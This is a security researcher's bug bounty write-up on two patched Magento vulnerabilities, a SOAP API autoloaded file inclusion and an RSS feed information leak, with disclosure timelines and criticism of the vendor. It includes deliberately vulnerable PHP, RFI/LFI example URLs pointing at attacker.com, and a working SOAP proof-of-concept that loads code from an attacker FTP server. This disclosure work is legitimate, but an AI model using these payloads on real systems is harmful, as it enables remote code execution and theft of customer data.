---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-03-03_hacking-magento-ecommerce-for-fun-and-17000-usd.md
original_filename: 2016-03-03_hacking-magento-ecommerce-for-fun-and-17000-usd.md
title: Hacking Magento eCommerce For Fun And 17.000 USD
category: documents
detected_topics:
- command-injection
- path-traversal
- sso
- automation-abuse
- csrf
- information-disclosure
tags:
- imported
- documents
- command-injection
- path-traversal
- sso
- automation-abuse
- csrf
- information-disclosure
language: en
raw_sha256: b4219c6ef8ea31a3480e5e460abdf2c5129b2681ec67fe5efbdc90bf827ae08a
text_sha256: 51829c8340f563a6921e780e0c8acc2f33466e40f9603804a70d0a3833017092
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking Magento eCommerce For Fun And 17.000 USD

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-03-03_hacking-magento-ecommerce-for-fun-and-17000-usd.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, sso, automation-abuse, csrf, information-disclosure
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `b4219c6ef8ea31a3480e5e460abdf2c5129b2681ec67fe5efbdc90bf827ae08a`
- Text SHA256: `51829c8340f563a6921e780e0c8acc2f33466e40f9603804a70d0a3833017092`


## Content

---
title: "Hacking Magento eCommerce For Fun And 17.000 USD"
page_title: "Hacking Magento eCommerce For Fun And 17.000 USD | Karma(In)Security"
url: "http://karmainsecurity.com/hacking-magento-ecommerce-for-fun-and-17000-usd"
final_url: "https://karmainsecurity.com/hacking-magento-ecommerce-for-fun-and-17000-usd"
authors: ["Egidio Romano / EgiX"]
programs: ["Adobe"]
bugs: ["Information disclosure", "LFI", "RFI"]
bounty: "17000"
publication_date: "2016-03-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6313
---

# Hacking Magento eCommerce For Fun And 17.000 USD

published
  March 3, 2016
reading time
  12 minutes

Magento, which was [acquired by Ebay Inc](https://web.archive.org/web/20160922154734/https://www.ebayinc.com/stories/news/ebay-to-acquire-magento/) back in 2011, is one of the most popular e-commerce platforms written in PHP. There is an interesting [bug bounty program](https://magento.com/security/reporting-magento-security-issue) in place that offers bounties of up to 10,000$ for Information Disclosure and Remote Code Execution vulnerabilities. In November 2014, I decided to give it a try, so I started looking for security bugs in Magento CE, and almost immediately I discovered a [PHP Object Injection](https://www.owasp.org/index.php/PHP_Object_Injection) vulnerability which (un)fortunately requires administrator privileges in order to be exploited. I thought this reason was good enough to choose not to report my finding under their bug bounty program, since Magento administrators should already be able to upload and execute arbitrary code through the administration panel. However, after a couple of weeks a friend of mine encouraged me to submit the finding, because you never know. So I did it, and when I finished writing my report including a PoC, and I was about to send it, I noticed that the bug had already been (silently!) patched only a few days earlier! The researcher who reported the vulnerability has been [awarded with 2,500$](https://ebrietas0.blogspot.com/2015/08/magento-bug-bounty-1-2-csrf-to-code.html) for the very same finding…

![doh!](/img/doh.jpg)

A couple of months later, in February 2015, there was a lot of rumors about what I consider [a very nice piece of research](https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/) which chains several vulnerabilities in Magento that ultimately allow an unauthenticated attacker to execute arbitrary PHP code on the web server. Getting inspired by these vulnerabilities, I decided to come back to Magento source code looking for new security bugs, and I discovered and reported two vulnerabilities which made me win two bounties I’d never thought I’d receive: **8,000$** and **9,000$**. Both of the vulnerabilities were discovered in February 2015, however I decided to report only a “potential Remote Code Execution” at a first stage, because I thought the other one – a trivial information leakage bug – had a security impact too low in order to be eligible for the bug bounty program, in other words I thought it wasn’t a “real” security issue. I was wrong (again!)…

#### • Autoloaded File Inclusion in SOAP API (CVE-2015-6497)

There is a class of vulnerabilities that might affect certain PHP applications which uses an “exploitable” autoloading mechanism. The “[Autoloading Classes](http://php.net/manual/en/language.oop5.autoload.php)” feature has been introduced in PHP 5.0 with the magic function ___autoload()_ which is automatically called when your code references a class or interface that hasn’t been loaded yet. So, instead of including every needed class by hand, it is possible to register a function that gets called as soon as the code tries to instantiate an unknown class. This function gets passed the unknown class name and is responsible for including the right file that contains the class definition. While this feature is extremely useful and powerful, it might introduce potential [Local/Remote File Inclusion](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) vulnerabilities when user-controlled input is used as a class name. Indeed, if an attacker can control the class name variable passed to an autoloading function, she could try to play around with it in order to include an arbitrary file and execute PHP code remotely. There are multiple ways to trigger the autoloader, the most obvious is class instantiation using the _new_ operator. In addition to that, there are some PHP functions which can be considered a _sensitive sink_ for this class of vulnerabilities. Here is an incomplete list:

  * [class_exists()](http://php.net/manual/en/function.class-exists.php)
  * [interface_exists()](http://php.net/manual/en/function.interface-exists.php)
  * [method_exists()](http://php.net/manual/en/function.method-exists.php)
  * [property_exists()](http://php.net/manual/en/function.property-exists.php)
  * [is_subclass_of()](http://php.net/manual/en/function.is-subclass-of.php)
  * …

So, when user-controlled input (_tainted data_) enters one of these _sensitive sinks_ there’s a chance for the application to be vulnerable to an “**Autoloaded File Inclusion** ” attack. Let’s see a simple example of vulnerable code:
  
  
  1 /* Some code... */
  2
  3 function __autoload($class_name)
  4 {
  5  include $class\_name . '.php';
  6 }
  7
  8 if(isset($_GET['class']) && class_exists($_GET['class']))
  9 {
  10  $myObject = new $_GET['class'];
  11 }
  12 else
  13 {
  14  die('No class found');
  15 }
  16
  17 /* Some code... */

In this example an attacker controls a class name via the GET parameter “class”, which is first used with the `class_exists()` function (triggering the autoloader in case it is an unknown class) and then to instantiate a new object. This means that the attacker can control the **$class_name** variable passed to the autoloader, therefore it could be possible to include arbitrary files from both local or remote resources by invoking URLs like these:

<http://example.com/vuln.php?class=http://attacker.com/shell>  
<http://example.com/vuln.php?class=../../../tmp/cache/attacker_controlled/file>

In the first case the autoloader will try to include and execute the PHP code located at <http://attacker.com/shell.php>, resulting in a Remote File Inclusion (RFI); while in the second case the autoloader will try to include and execute the PHP code located into the file /tmp/cache/attacker_controlled/file.php, resulting in a Local File Inclusion (LFI). Furthermore, in cases like this where the attacker controls the classname’s prefix, in addition to _http://_ other [PHP wrappers](http://php.net/manual/en/wrappers.php) might be abused in order to execute arbitrary PHP code.

According to [the official PHP documentation](http://php.net/manual/en/language.oop5.basic.php) “a valid class name starts with a letter or underscore, followed by any number of letters, numbers, or underscores”. That means an attacker cannot include arbitrary files via class names because it should not be possible to e.g. use path traversal sequences (../../) through them. But here comes the problem: there was [a bug](https://bugs.php.net/bug.php?id=62789) in the PHP core which allowed to invoke class autoloaders with invalid class names. This bug was solved in January 2014 with the release of PHP versions [5.4.24](http://www.php.net/ChangeLog-5.php#5.4.24) and [5.5.8](http://www.php.net/ChangeLog-5.php#5.5.8), and that’s probably one of the reasons why Magento’s security engineers have undervalued this issue.

#### Magento Vulnerability

The vulnerability in Magento is caused by the code that handles the “[catalogProductCreate](http://devdocs.magento.com/guides/m1x/api/soap/catalog/catalogProduct/catalog_product.create.html)” SOAP API call. The vulnerable code is located into the **/app/code/core/Mage/Catalog/Model/Product/Api/V2.php** script:
  
  
  1  public function create($type, $set, $sku, $productData, $store = null)
  2  {
  3  if (!$type || !$set || !$sku) {
  4  $this->_fault('data_invalid');
  5  }
  6
  7  $this->_checkProductTypeExists($type);
  8  $this->_checkProductAttributeSet($set);
  9
  10  /** @var $product Mage_Catalog_Model_Product */
  11  $product = Mage::getModel('catalog/product');
  12  $product->setStoreId($this->_getStoreId($store))
  13  ->setAttributeSetId($set)
  14  ->setTypeId($type)
  15  ->setSku($sku);
  16
  17  if (!property_exists($productData, 'stock_data')) {
  18  //Set default stock_data if not exist in product data
  19  $_stockData = array('use_config_manage_stock' => 0);
  20  $product->setStockData($_stockData);
  21  }

This method expects the **$productData** parameter to be an array (in form of a _stdClass_ object) and uses the `property_exists()` function with it. However, an attacker can manipulate a SOAP request arbitrarily and send the **$productData** parameter in form of a string. In this case, if the string passed to the `property_exists()` function is an unknown class, any registered autoloader function will be triggered. When the `property_exists()` function is called there’s only one autoloader function registered, that is the `Varien_Autoload::autoload()` method:
  
  
  1  public function autoload($class)
  2  {
  3  if ($this->_collectClasses) {
  4  $this->_arrLoadedClasses[self::$_scope][] = $class;
  5  }
  6  if ($this->_isIncludePathDefined) {
  7  $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
  8  } else {
  9  $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
  10  }
  11  $classFile.= '.php';
  12  //echo $classFile;die();
  13  return include $classFile;
  14  }

In such a scenario, the **$class** parameter automatically passed to this method is exactly the same string value sent through the **$productData** parameter from the SOAP request, which after some replacementes and a “.php” string appended to it, is being used in a call to the `include()` function. This may result in an arbitrary file inclusion (both from local or remote resources) and could be exploited to include and execute arbitrary PHP code. There are some conditions which should be met to exploit this vulnerability:

  * an API user account with privileges to create a catalog product is required;
  * in order to include arbitrary files from remote locations, Magento should run on PHP before 5.4.24 or 5.5.8, because such versions have fixed the issue related to invalid class names in the autoloading process;
  * in order to include arbitrary files from remote locations the “allow_url_include” directive must be set to On;
  * in case the “allow_url_include” directive is set to Off it might still be possible to include files from remote locations using the _ssh2.sftp://_ wrapper (which requires the SSH2 extension to be installed) or execute arbitrary OS commands leveraging the _expect://_ wrapper (which requires the Expect extension to be installed).

NOTE: if Magento is running on PHP version after 5.4.23 or 5.5.7 the vulnerability could still be exploited by including a local file with a .php extension (something like /tmp/test.php). If Magento is running on PHP before 5.3.4 the vulnerability could be exploited to include arbitrary local files with any extension (e.g. a session file containing malicious PHP code injected by the attacker) because NULL bytes are allowed within the path (see [CVE-2006-7243](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-7243)).

**Proof of Concept**

A remote attacker with valid API credentials could send a SOAP request like the following in order to exploit the vulnerability:
  
  
  POST /magento/index.php/api/v2_soap HTTP/1.0
  Host: localhost
  Content-Length: 804
  Connection: close
  
  <?xml version="1.0" encoding="UTF-8"?>
  <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Magento" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SOAP-ENV:Body>
  <ns1:catalogProductCreate>
  <sessionId xsi:type="xsd:string">VALID_SESSION</sessionId>
  <type xsi:type="xsd:string">simple</type>
  <set xsi:type="xsd:string">4</set>
  <sku xsi:type="xsd:string">test</sku>
  <productData xsi:type="xsd:base64Binary">ZnRwOi8vYXR0YWNrZXI6cGFzc3dvcmRAYXR0YWNrZXJfc2VydmVyLmNvbS9ob21lL2F0dGFja2VyL2V2aWw=</productData>
  <storeView xsi:nil="true"/>
  </ns1:catalogProductCreate>
  </SOAP-ENV:Body>
  </SOAP-ENV:Envelope>
  

The **“productData”** parameter has been encoded in base64 within the SOAP request, and the decoded string is the following:

ftp://attacker:password@attacker_server.com/home/attacker/evil

This means that leveraging the _ftp://_ wrapper, an attacker might be able to force Magento to load and execute malicious code from a FTP server under their control. In this example, the attacker only has to put the malicious code under /home/attacker/evil.php. However, as we said before, other PHP wrappers might be abused, potentially leading to direct arbitrary PHP code execution.

#### Responsible Disclosure Timeline

As I was saying, I reported this vulnerability in late February 2015, and I received the first reply from the Magento Security Team on June 23, 2015, stating that my submission was not eligible for the bug bounty program, because it was found to be invalid and not actionable. The reason for the rejection was that there are too many requirements to exploit the vulnerability. First of all, it requires Magento to be running on outdated PHP versions, because this kind of vulnerability has been fixed in the PHP core engine at the beginning of 2014. However, until today there are still many websites out there using such outdated PHP versions. That should be one of the reasons why the Magento Security Team replied on June 25, stating the following:

> _We were able to confirm your issue. Even though it requires knowing API credentials, it should not be possible to execute such actions. The PHP versions that are additionally vulnerable, while old are still used in popular distributions like RHEL 7.1._  _We will schedule fixing this issue for our next product release given lower priority.**We will inform you regarding possible awards associated with this report.**_

On August 4, 2015, a bundle of patches ([SUPEE-6482](https://magento.com/security/patches/supee-6482)), which resolved several security-related issues, including the one I reported in February, was released by the Magento team. On the same day Magento released new versions (Community Edition 1.9.2.1 and Enterprise Edition 1.14.2.1) that include SUPEE-6482 along with other security patches. On August 13 I sent them an email asking whether there was any chance to get a bounty for reporting such a vulnerability. I had to ping them twice more, before getting their reply on August 25:

> _Hello Egidio, Congratulations!  
>  Your vulnerability report and proof of concept have been accepted and you will be receiving a bounty of USD $8,000._

I published [KIS-2015-04](/KIS-2015-04) on September 11, 2015 and I received my bug bounty on September 21, 2015.

#### • Information Disclosure in RSS Feed (CVE-2016-2212)

After a while, in late October 2015, I remembered about that information leakage bug I discovered back in February, and I wondered “Why don’t try to report this as well? Maybe I’m missing something out and I wrongly believe this isn’t a real security issue”. Actually I was missing something crucial, the fact that leveraging this vulnerability a remote unauthenticated attacker might be able to download order comments and other order-related information, potentially including [Personally Identifiable Information](https://en.wikipedia.org/wiki/Personally_identifiable_information) or credit card data… What a bad “AppSec Guy” I am!! 😁

I reported this vulnerability on October 29, 2015, including a Proof of Concept code, and a proposed patch for the vulnerability, which is exactly the same they used to fix the issue. I received a reply from the Magento Security Team on the very same day:

> _Hello Egidio,  
>  Thank you for your submission. We have logged ticket APPSEC-1171 to track this issue. **We will reach out to you once our security engineers have validated this issue**. Per the Magento Responsible Disclosure Guidelines, we ask that you do not disclose your finding to the public or to the media while we validate your submission with our security engineers._

After some months of silence, it was a wonderful Sunday afternoon when I noticed that some days earlier, specifically on January 20, 2016, the Magento team released [SUPEE-7405](https://magento.com/security/patches/supee-7405) and new Magento versions which include fixes for several security-related issues, including “Information Disclosure in RSS feed – APPSEC-1171”. Consequently, I sent them another email asking whether there was any chance to get a bounty for reporting such a vulnerability (again!). I got their reply on February 1, 2016:

> _Hello Egidio, Congratulations!  
>  Your vulnerability report and proof of concept have been accepted and you will be receiving a bounty of USD $9,000._

I received my bug bounty on February 12, 2016 and I published [KIS-2016-02](/KIS-2016-02) on February 23, 2016. Actually there is a weird coincidence, because that very same day, only a few hours before publishing the advisory on my website, they pushed an update: [SUPEE-7405 v1.1](https://magento.com/security/patches/supee-7405) patch bundle. It could be just a coincidence, however I found this very curious… don’t you?

### Conclusion

Seeing my personal experience with the Magento bug bounty program (and even experiences from other security researchers), it looks like they truly believe in a “[security through obscurity](https://en.wikipedia.org/wiki/Security_through_obscurity)” methodology. I’m quite disappointed by the fact they tried to downplay the severity of my vulnerabilities, silently patching them after several months, without letting me know their progresses. However, what really disappoints me is that my vulnerabilities seem to be quite critical, specially considering they’re the only two classes of security bugs they’re willing to pay up to 10,000$ under their bug bounty program. I had to ping them several times in order to get my bounties, so I believe they tried to “obscure” and underevaluate my findings not only because of their “security through obscurity” methodology, but probably because they were also hoping I’d never noticed their advisories with my name and the vulnerabilities I reported, and never claimed my bounties for such findings?
